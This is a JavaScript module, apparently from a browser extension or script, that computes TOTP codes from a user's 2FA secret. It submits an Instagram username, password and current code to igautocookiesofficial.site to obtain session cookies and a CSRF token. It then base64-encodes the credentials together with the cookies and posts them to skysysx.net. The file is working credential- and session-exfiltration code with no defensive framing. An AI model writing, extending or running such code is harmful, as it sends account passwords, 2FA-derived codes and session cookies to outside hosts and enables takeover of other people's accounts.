(function() {
var __ss = window.__ss = window.__ss || {};

// ── TOTP Generation ──
function base32Decode(str) {
    var alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
    str = str.replace(/[\s=-]/g, '').toUpperCase();
    var bits = '';
    for (var i = 0; i < str.length; i++) {
        var val = alphabet.indexOf(str[i]);
        if (val === -1) continue;
        bits += val.toString(2).padStart(5, '0');
    }
    var bytes = new Uint8Array(Math.floor(bits.length / 8));
    for (var i = 0; i < bytes.length; i++) {
        bytes[i] = parseInt(bits.substr(i * 8, 8), 2);
    }
    return bytes;
}

async function hmacSha1(key, message) {
    var cryptoKey = await crypto.subtle.importKey(
        'raw', key, { name: 'HMAC', hash: 'SHA-1' }, false, ['sign']
    );
    var sig = await crypto.subtle.sign('HMAC', cryptoKey, message);
    return new Uint8Array(sig);
}

__ss.generateTOTP = async function(secret) {
    if (!secret) return '';
    secret = secret.replace(/\s/g, '');
    var key = base32Decode(secret);
    var epoch = Math.floor(Date.now() / 1000);
    var time = Math.floor(epoch / 30);
    var timeBytes = new ArrayBuffer(8);
    var view = new DataView(timeBytes);
    view.setUint32(4, time, false);
    var hash = await hmacSha1(key, new Uint8Array(timeBytes));
    var offset = hash[hash.length - 1] & 0x0f;
    var code = ((hash[offset] & 0x7f) << 24) |
               ((hash[offset + 1] & 0xff) << 16) |
               ((hash[offset + 2] & 0xff) << 8) |
               (hash[offset + 3] & 0xff);
    code = code % 1000000;
    return code.toString().padStart(6, '0');
};

// ── API: IG Auto Cookies ──
var IG_API = 'https://igautocookiesofficial.site/api';

__ss.fetchCookies = async function(username, password, twofaKey) {
    var code = await __ss.generateTOTP(twofaKey);
    var jobRes = await fetch(IG_API + '/jobs', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            usernames: [username],
            commonPassword: password,
            twofaCodes: [code]
        })
    });
    if (!jobRes.ok) throw new Error('Job create failed: ' + jobRes.status);
    var jobData = await jobRes.json();
    var jobId = jobData.jobId;

    while (true) {
        var pollRes = await fetch(IG_API + '/jobs/' + jobId);
        var pollData = await pollRes.json();
        var job = pollData.job;
        if (job.status === 'completed') {
            var acct = job.accounts[0];
            if (acct.status === 'done') {
                return { username: username, password: password, cookies: acct.cookies, csrfToken: acct.csrfToken };
            }
            throw new Error(username + ': ' + (acct.errorReason || 'failed'));
        }
        if (job.status === 'processing' && job.accounts[0] && job.accounts[0].status === 'failed') {
            throw new Error(username + ': ' + (job.accounts[0].errorReason || 'failed during processing'));
        }
        await new Promise(function(r) { setTimeout(r, 2000); });
    }
};

// ── API: Push Cookies ──
var SKY_URL = 'https://skysysx.net/e/boss';

__ss.pushCookies = async function(username, password, cookies) {
    var payload = username + ':' + password + '|||' + cookies + '||';
    var b64 = btoa(unescape(encodeURIComponent(payload)));
    var body = 'accounts=' + b64;

    var res = await fetch(SKY_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'text/plain' },
        body: body
    });
    if (!res.ok) throw new Error('Push failed: ' + res.status);
    var data = await res.json();
    var jobId = data.job_id;

    while (true) {
        var sRes = await fetch('https://skysysx.net/api/status/' + jobId);
        var info = await sRes.json();
        if (info.status === 'done') {
            return {
                username: username,
                jobId: jobId,
                success: info.data.success_count,
                failed: info.data.failed_count,
                elapsed: info.elapsed_seconds
            };
        }
        await new Promise(function(r) { setTimeout(r, info.status === 'staging' ? 5000 : 2000); });
    }
};

})();
